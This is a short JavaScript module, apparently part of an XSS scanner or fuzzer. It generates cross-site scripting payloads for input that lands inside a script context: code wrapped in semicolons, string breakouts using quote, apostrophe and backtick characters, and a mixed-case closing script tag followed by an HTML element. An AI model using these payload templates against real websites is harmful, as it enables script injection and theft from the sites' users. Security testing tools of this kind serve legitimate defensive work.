function scriptPayloads({reflection, jsCode, tagClass, htmlElements}) {
    const exitStrings = ['"', "'", '`'];
    return [
        {
            payload: `;${jsCode};`,
        },
        {
            payload: ` ${jsCode} `,
        },
        ...exitStrings.map(exit=>({
            payload: `${exit}-(${jsCode})-${exit}`,
        })),
        ...htmlElements.map(({tag, trigger}) => ({
            payload: `</ScRiPt>${tag}`,
            trigger,
        })),
    ];
}

module.exports = scriptPayloads;
